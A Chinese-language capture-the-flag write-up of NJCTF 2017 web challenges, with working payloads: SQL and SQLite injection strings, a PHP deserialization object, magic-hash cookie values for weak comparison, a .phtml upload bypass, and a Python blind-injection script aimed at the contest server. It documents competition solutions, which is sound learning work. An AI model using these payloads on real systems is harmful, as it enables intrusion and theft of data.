---
title: NJCTF WEB Writeup
tags: [write-up]
date: 2017-03-18 22:55
---
Login 首先创建id  登陆进去 发现要用admin登陆   首先用爆破想想不可能 其次利用注册重新注册admin 一开始想的是利用SQL注释等注册但发现不行 其次就想到长度限制&空格漏洞 'guest'= 'guest          '                  首先绕过重名检测   ，接着设置了长度限制之后用空格漏洞注册注册admin Get Flag随便输入试
<!-- more -->
<link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css">
<div class="markdown_views"><h1 id="login">Login</h1>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170318192434235?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
首先创建id  登陆进去 发现要用admin登陆  <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170318192456188?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
首先用爆破想想不可能 <br>
其次利用注册重新注册admin <br>
一开始想的是利用SQL注释等注册但发现不行 <br>
其次就想到长度限制&amp;空格漏洞 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170318192521034?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></br></br></br></br></img></br></br></img></p>
<pre class="prettyprint"><code class=" hljs bash"><span class="hljs-string">'guest'</span>= <span class="hljs-string">'guest          '</span>                 </code></pre>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170318192655566?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
首先绕过重名检测   ，接着设置了长度限制之后用空格漏洞注册注册admin <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170318192724660?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></br></img></p>
<h1 id="get-flag">Get Flag</h1>
<p>随便输入试试 <br>
1.jpga <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170318193338200?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
发现是cat 命令 <br>
利用ls 及 cat 命令查找flag <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170318193527398?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></br></br></img></br></br></p>
<h1 id="text-wall">Text wall</h1>
<p>首先扫描目录找到源码 .index.php.swo <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170318194425388?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
发现可以读取文件，我们发现图片的存储是序列化存储 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170318194618155?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
解开之后是一个数组 <br>
打印内容的时候是循环遍历打印</br></br></img></br></br></img></br></p>
<pre class="prettyprint"><code class=" hljs php"><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) {
    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span>;
}</code></pre>
<p>如果$a是一个类，上面的结构回将类中的变量循环打印出来 <br>
__tostring 的触发事件是echo 类，正符合此题</br></p>
<pre class="prettyprint"><code class=" hljs xml"><span class="php"><span class="hljs-preprocessor">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">Class</span> <span class="hljs-title">filelist</span>{</span>
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span> = <span class="hljs-string">''</span>;
}
<span class="hljs-variable">$z</span> = <span class="hljs-keyword">new</span> filelist();
<span class="hljs-variable">$z</span>-&gt;source = <span class="hljs-string">'index.php'</span>;
<span class="hljs-variable">$y</span> = <span class="hljs-keyword">new</span> filelist();
<span class="hljs-variable">$y</span>-&gt;source = <span class="hljs-variable">$z</span>;
<span class="hljs-keyword">echo</span> sha1(serialize(<span class="hljs-variable">$y</span>)).serialize(<span class="hljs-variable">$y</span>);
<span class="hljs-preprocessor">?&gt;</span></span></code></pre>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170318195914079?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
打开文件夹就是flag <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170318200326819?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></br></img></p>
<h1 id="wallet">Wallet</h1>
<p>这一题考了很多知识点 <br>
讲一下做题思路 <br>
首先发现了源码index.php.bak <br>
源码有加密，丢淘宝解密 <br>
得到源码</br></br></br></br></p>
<pre class="prettyprint"><code class=" hljs xml"><span class="php"><span class="hljs-preprocessor">&lt;?php</span>
<span class="hljs-keyword">require_once</span>(<span class="hljs-string">"db.php"</span>);
<span class="hljs-variable">$auth</span> = <span class="hljs-number">0</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">"auth"</span>])) {  
    <span class="hljs-variable">$auth</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">"auth"</span>];
    <span class="hljs-variable">$hsh</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">"hsh"</span>];  
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$auth</span> == <span class="hljs-variable">$hsh</span>) {
        <span class="hljs-variable">$auth</span> = <span class="hljs-number">0</span>;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1((string)<span class="hljs-variable">$hsh</span>) == md5((string)<span class="hljs-variable">$auth</span>)) { <span class="hljs-comment">// </span>
        <span class="hljs-variable">$auth</span> = <span class="hljs-number">1</span>; <span class="hljs-comment">// </span>
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-variable">$auth</span> = <span class="hljs-number">0</span>;
    }
} <span class="hljs-keyword">else</span> {
    <span class="hljs-variable">$auth</span> = <span class="hljs-number">0</span>;
    <span class="hljs-variable">$s</span> = <span class="hljs-variable">$auth</span>;
    setcookie(<span class="hljs-string">"auth"</span>, <span class="hljs-variable">$s</span>);
    setcookie(<span class="hljs-string">"hsh"</span>, sha1((string)<span class="hljs-variable">$s</span>));
}
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$auth</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'query'</span>])) {
        <span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> SQLite3(<span class="hljs-variable">$SQL_DATABASE</span>, SQLITE3_OPEN_READONLY);
        <span class="hljs-variable">$qstr</span> = SQLITE3::escapeString(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'query'</span>]);
        <span class="hljs-variable">$query</span> = <span class="hljs-string">"SELECT amount FROM my_wallets WHERE id=$qstr"</span>;
        <span class="hljs-variable">$result</span> = <span class="hljs-variable">$db</span>-&gt;querySingle(<span class="hljs-variable">$query</span>);
        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$result</span> === <span class="hljs-keyword">NULL</span>) {
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"Error - invalid query"</span>;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"Wallet contains: $result"</span>;  <span class="hljs-comment">// 输出flag</span>
        }
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;html&gt;&lt;head&gt;&lt;title&gt;Admin Page&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Welcome to the admin panel!&lt;br /&gt;&lt;br /&gt;&lt;form name='input' action='admin.php' method='get'&gt;Wallet ID: &lt;input type='text' name='query'&gt;&lt;input type='submit' value='Submit Query'&gt;&lt;/form&gt;&lt;/body&gt;&lt;ml&gt;"</span>;
    }
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">"Sorry, not authorized."</span>;

<span class="hljs-preprocessor">?&gt;</span></span></code></pre>
<p>首先要绕过</p>
<pre class="prettyprint"><code class=" hljs mel"><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">"auth"</span>])) {  
    <span class="hljs-variable">$auth</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">"auth"</span>];
    <span class="hljs-variable">$hsh</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">"hsh"</span>];  
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$auth</span> == <span class="hljs-variable">$hsh</span>) {
        <span class="hljs-variable">$auth</span> = <span class="hljs-number">0</span>;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$hsh</span>) == md5((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$auth</span>)) { <span class="hljs-comment">// </span>
        <span class="hljs-variable">$auth</span> = <span class="hljs-number">1</span>; <span class="hljs-comment">// </span>
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-variable">$auth</span> = <span class="hljs-number">0</span>;
    }
} <span class="hljs-keyword">else</span> {
    <span class="hljs-variable">$auth</span> = <span class="hljs-number">0</span>;
    <span class="hljs-variable">$s</span> = <span class="hljs-variable">$auth</span>;
    setcookie(<span class="hljs-string">"auth"</span>, <span class="hljs-variable">$s</span>);
    setcookie(<span class="hljs-string">"hsh"</span>, sha1((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$s</span>));
}</code></pre>
<p>利用php弱类型比较</p>
<pre class="prettyprint"><code class=" hljs bash"><span class="hljs-variable">$hsh</span> = <span class="hljs-string">'aaroZmOk'</span>
<span class="hljs-variable">$auth</span> = <span class="hljs-string">'QNKCDZO'</span></code></pre>
<p>登进admin <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170318202439599?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
接下来就是简单的sqlite 注入 <br>
猜测为 id字段 flag表 当然也可以利用查表得到</br></br></img></br></p>
<pre class="prettyprint"><code class=" hljs sql">1 union <span class="hljs-operator"><span class="hljs-keyword">select</span> group_concat(tbl_name) <span class="hljs-keyword">from</span> sqlite_master limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>-- 暴表
<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">sql</span> <span class="hljs-keyword">from</span> sqlite_master <span class="hljs-keyword">where</span> tbl_name=<span class="hljs-string">"flag"</span> <span class="hljs-keyword">and</span> type=<span class="hljs-string">"table"</span> limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>-- 爆字段
<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(id) <span class="hljs-keyword">from</span> flag limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>--暴内容</span></code></pre>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170318203051044?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<h1 id="pictures-wall">pictures‘ wall</h1>
<p>一道上传题，上传类的题目做得也不少了，都是一个套路。 <br>
看看这题 <br>
首先找到上传窗口，根据题目提示利用host：127.0.0.1登录成功找到上传界面 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170318205647644?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
我们在上传时改包 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170318210015648?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
上传成功，试了.php345 .inc .phtml .phpt .phps 最后.phtml可以解析，其他的都不行 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170318211057164?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170318211215820?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></img></br></br></img></br></br></img></br></br></br></p>
<pre class="prettyprint"><code class=" hljs scss"><span class="hljs-function">print_r(<span class="hljs-function">scandir(“/opt/lampp/htdocs”)</span>)</span>; 
echo <span class="hljs-function">exec(<span class="hljs-string">'pwd'</span>)</span>;<span class="hljs-comment">//查看当前文件路径</span>
<span class="hljs-function">print_r(<span class="hljs-function">scandir(<span class="hljs-string">'../../'</span>)</span>)</span></code></pre>
<h1 id="be-admin">Be admin</h1>
<p>有时候看见密码的题目都不想做，太麻烦 <br>
利用SQLmap跑了一遍跑出了用户名及密码加密过后的值</br></p>
<pre class="prettyprint"><code class=" hljs asciidoc"><span class="hljs-attribute">[1 entry]</span>
<span class="hljs-code">+---------+</span>----------<span class="hljs-code">+-------------------------------------------------------------------+</span>
<span class="hljs-header">| isadmin | username | encrypted_pass                                                    |
+---------+----------+-------------------------------------------------------------------+</span>
<span class="hljs-header">| 1       | admin    | aVZ1c2VkQnk0ZG1pbiEhIV+W2coxQmZQWMLGaWZuItWr+E26IKb1OFh4Shf/fNSQ  |
+---------+----------+-------------------------------------------------------------------+</span></code></pre>
<p>扫描目录得到源码</p>
<pre class="prettyprint"><code class=" hljs xml"><span class="php"><span class="hljs-preprocessor">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);
define(<span class="hljs-string">"SECRET_KEY"</span>, <span class="hljs-string">"......"</span>);
define(<span class="hljs-string">"METHOD"</span>, <span class="hljs-string">"aes-128-cbc"</span>);

session_start();

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_random_token</span><span class="hljs-params">()</span>{</span>
    <span class="hljs-variable">$random_token</span>=<span class="hljs-string">''</span>;
    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>;<span class="hljs-variable">$i</span>++){
        <span class="hljs-variable">$random_token</span>.=chr(rand(<span class="hljs-number">1</span>,<span class="hljs-number">255</span>));
    }
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$random_token</span>;
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_identity</span><span class="hljs-params">()</span>
{</span>
    <span class="hljs-keyword">global</span> <span class="hljs-variable">$defaultId</span>;
    <span class="hljs-variable">$j</span> = <span class="hljs-variable">$defaultId</span>;
    <span class="hljs-variable">$token</span> = get_random_token();
    <span class="hljs-variable">$c</span> = openssl_encrypt(<span class="hljs-variable">$j</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="hljs-variable">$token</span>);
    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'id'</span>] = base64_encode(<span class="hljs-variable">$c</span>);
    setcookie(<span class="hljs-string">"ID"</span>, base64_encode(<span class="hljs-variable">$c</span>));
    setcookie(<span class="hljs-string">"token"</span>, base64_encode(<span class="hljs-variable">$token</span>));
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$j</span> === <span class="hljs-string">'admin'</span>) {
        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'isadmin'</span>] = <span class="hljs-keyword">true</span>;
    } <span class="hljs-keyword">else</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'isadmin'</span>] = <span class="hljs-keyword">false</span>;

}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test_identity</span><span class="hljs-params">()</span>
{</span>
    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">"token"</span>]))
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>();
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'id'</span>])) {
        <span class="hljs-variable">$c</span> = base64_decode(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'id'</span>]);
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$u</span> = openssl_decrypt(<span class="hljs-variable">$c</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">"token"</span>]))) {
            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$u</span> === <span class="hljs-string">'admin'</span>) {
                <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'isadmin'</span>] = <span class="hljs-keyword">true</span>;
            } <span class="hljs-keyword">else</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'isadmin'</span>] = <span class="hljs-keyword">false</span>;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"ERROR!"</span>);
        }
    }
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span><span class="hljs-params">(<span class="hljs-variable">$encrypted_pass</span>, <span class="hljs-variable">$pass</span>)</span>
{</span>
    <span class="hljs-variable">$encrypted_pass</span> = base64_decode(<span class="hljs-variable">$encrypted_pass</span>);
    <span class="hljs-variable">$iv</span> = substr(<span class="hljs-variable">$encrypted_pass</span>, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>);
    <span class="hljs-variable">$cipher</span> = substr(<span class="hljs-variable">$encrypted_pass</span>, <span class="hljs-number">16</span>);
    <span class="hljs-variable">$password</span> = openssl_decrypt(<span class="hljs-variable">$cipher</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="hljs-variable">$iv</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$password</span> == <span class="hljs-variable">$pass</span>;
}



<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">need_login</span><span class="hljs-params">(<span class="hljs-variable">$message</span> = NULL)</span> {</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"   &lt;!doctype html&gt;
        &lt;html&gt;
        &lt;head&gt;
        &lt;meta charset=\"UTF-8\"&gt;
        &lt;title&gt;Login&lt;/title&gt;
        &lt;link rel=\"stylesheet\" href=\"CSS/target.css\"&gt;
            &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js\"&gt;&lt;/script&gt;
        &lt;/head&gt;
        &lt;body&gt;"</span>;
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$message</span>)) {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"  &lt;div&gt;"</span> . <span class="hljs-variable">$message</span> . <span class="hljs-string">"&lt;/div&gt;\n"</span>;
    }
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;form method=\"POST\" action=''&gt;
            &lt;div class=\"body\"&gt;&lt;/div&gt;
                &lt;div class=\"grad\"&gt;&lt;/div&gt;
                    &lt;div class=\"header\"&gt;
                        &lt;div&gt;Log&lt;span&gt;In&lt;/span&gt;&lt;/div&gt;
                    &lt;/div&gt;
                    &lt;br&gt;
                    &lt;div class=\"login\"&gt;
                        &lt;input type=\"text\" placeholder=\"username\" name=\"username\"&gt;
                        &lt;input type=\"password\" placeholder=\"password\" name=\"password\"&gt;               
                        &lt;input type=\"submit\" value=\"Login\"&gt;
                    &lt;/div&gt;
                     &lt;script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'&gt;&lt;/script&gt;
            &lt;/form&gt;
        &lt;/body&gt;
    &lt;/html&gt;"</span>;
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_homepage</span><span class="hljs-params">()</span> {</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;!doctype html&gt;
&lt;html&gt;
&lt;head&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;"</span>;
    <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;
    printf(<span class="hljs-string">"Hello ~~~ ctfer! "</span>);
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">"isadmin"</span>])
        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;div&gt;&lt;a href=\"logout.php\"&gt;Log out&lt;/a&gt;&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;"</span>;

}

<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'username'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'password'</span>])) {
    <span class="hljs-variable">$username</span> = (string)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'username'</span>];
    <span class="hljs-variable">$password</span> = (string)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'password'</span>];
    <span class="hljs-variable">$query</span> = <span class="hljs-string">"SELECT username, encrypted_pass from users WHERE username='$username'"</span>;
    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-variable">$query</span>) <span class="hljs-keyword">or</span> trigger_error(<span class="hljs-variable">$conn</span>-&gt;error . <span class="hljs-string">"[$query]"</span>);
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$row</span> = <span class="hljs-variable">$res</span>-&gt;fetch_assoc()) {
        <span class="hljs-variable">$uname</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">'username'</span>];
        <span class="hljs-variable">$encrypted_pass</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">"encrypted_pass"</span>];
    }

    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$row</span> &amp;&amp; login(<span class="hljs-variable">$encrypted_pass</span>, <span class="hljs-variable">$password</span>)) {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"you are in!"</span> . <span class="hljs-string">"&lt;/br&gt;"</span>;
        get_identity();
        show_homepage();
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;script&gt;alert('login failed!');&lt;/script&gt;"</span>;
        need_login(<span class="hljs-string">"Login Failed!"</span>);
    }

} <span class="hljs-keyword">else</span> {
    test_identity();
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">"id"</span>])) {
        show_homepage();
    } <span class="hljs-keyword">else</span> {
        need_login();
    }
}</span></code></pre>
<p>源码到手 接下来就是代码审计 查找漏洞</p>
<h1 id="come-on">Come On</h1>
<p>这是道注入题，所以第一步找注入点 <br>
<code>1%df' || if(1=1,1,0)%23</code> 注意他过滤了<code>&lt;&gt; or  and</code> <br>
数据表，字段是猜出来的 <br>
<code>1%df' || exists(select(flag)from(flag))%23</code> <br>
等关键字，下面就基于内容长度的盲注</br></br></br></br></p>
<pre class="prettyprint"><code class=" hljs livecodeserver">import requests
<span class="hljs-keyword">string</span> = <span class="hljs-string">''</span>
<span class="hljs-keyword">for</span> i <span class="hljs-operator">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">33</span>):
    <span class="hljs-keyword">for</span> <span class="hljs-keyword">mid</span> <span class="hljs-operator">in</span> range(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):
        url = <span class="hljs-string">"http://218.2.197.235:23733/index.php?key=1%df' ||  if((select(right(left((select(flag)from(flag)),{}),1)))=binary({}),1,0)%23"</span>.<span class="hljs-built_in">format</span>(str(i),str(bin(<span class="hljs-keyword">mid</span>)))
        s=requests.<span class="hljs-built_in">get</span>(url=url)
        content=s.content
        <span class="hljs-built_in">length</span>=<span class="hljs-built_in">len</span>(content)
        <span class="hljs-comment">#print length</span>
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">length</span> &gt; <span class="hljs-number">1000</span> :
            <span class="hljs-keyword">string</span>+=chr(<span class="hljs-keyword">mid</span>)
            break
    print <span class="hljs-keyword">string</span></code></pre>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170319093637320?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p></div>